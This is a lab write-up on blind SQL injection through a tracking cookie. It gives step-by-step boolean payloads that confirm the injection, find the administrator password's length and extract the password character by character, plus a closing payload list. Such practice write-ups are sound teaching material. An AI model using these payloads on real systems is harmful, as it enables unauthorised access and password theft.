# Lab: Blind SQL injection with conditional responses

## Goal
- Find administrator password  
- Login as administrator  

---

## Step 1: Intercept Request
- Open lab  
- Capture request in Burp  
- Send to Repeater  
- Look at cookie:

TrackingId=xyz

---

## Step 2: Check Injection

' AND '1'='1  
→ Welcome back appears  

' AND '1'='2  
→ No Welcome back  

Injection confirmed  

---

## Step 3: Check Query Works

' AND (SELECT 'a')='a  

→ If "Welcome back" → working  

---

## Step 4: Check Admin User

' AND (SELECT 'a' FROM users WHERE username='administrator')='a  

→ Confirms admin exists  

---

## Step 5: Find Password Length

' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=1--  

Increase number until TRUE  

---

## Step 6: Find Password (Character by Character)

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a  

- Try a–z, 0–9  
- Move position: 1 → 2 → 3 ...  

---

## Step 7: Automate (Intruder)

- Send to Intruder  
- Attack type: Sniper  
- Payload: a–z0–9  
- Check "Welcome back"  

---

## Step 8: Login

Username: administrator  
Password: (found password)  

Lab Solved  

---

## Key Payloads

' AND '1'='1  
' AND '1'='2  
' AND (SELECT 'a')='a  
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=X--  
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a  
